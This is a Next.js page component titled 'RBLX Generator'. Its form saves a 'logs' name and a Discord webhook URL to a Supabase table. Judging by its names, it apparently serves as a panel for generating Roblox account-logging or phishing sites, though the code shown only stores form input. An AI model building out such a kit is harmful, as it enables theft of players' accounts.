"use client";
import { useState } from "react";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export default function Home() {
  const [name, setName] = useState("");
  const [webhook, setWebhook] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage("");

    if (!name || !webhook) {
      setMessage("⚠ Please fill out both fields!");
      setLoading(false);
      return;
    }

    const { error } = await supabase.from("websites").insert([
      { name: name, webhook: webhook, url: webhook },
    ]);

    if (error) {
      console.error(error);
      setMessage("❌ Failed to save: " + error.message);
    } else {
      setMessage("✅ Saved successfully to Supabase!");
      setName("");
      setWebhook("");
    }

    setLoading(false);
  };

  return (
    <main className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white p-6">
      <div className="max-w-md w-full bg-gray-900/70 backdrop-blur-xl rounded-2xl p-6 shadow-lg border border-gray-700">
        <h1 className="text-3xl font-bold mb-6 text-center">
          ⚙️ RBLX Generator
        </h1>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm mb-2 font-medium">Logs Name</label>
            <input
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
              placeholder="logs"
            />
          </div>

          <div>
            <label className="block text-sm mb-2 font-medium">
              Discord Webhook URL
            </label>
            <input
              type="url"
              value={webhook}
              onChange={(e) => setWebhook(e.target.value)}
              className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
              placeholder="https://discord.com/api/webhooks/..."
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full py-2 mt-4 bg-indigo-600 hover:bg-indigo-700 rounded-lg font-semibold transition"
          >
            {loading ? "Saving..." : "🚀 Generate"}
          </button>
        </form>

        {message && (
          <p className="mt-4 text-center text-sm text-gray-300">{message}</p>
        )}
      </div>
    </main>
  );
}
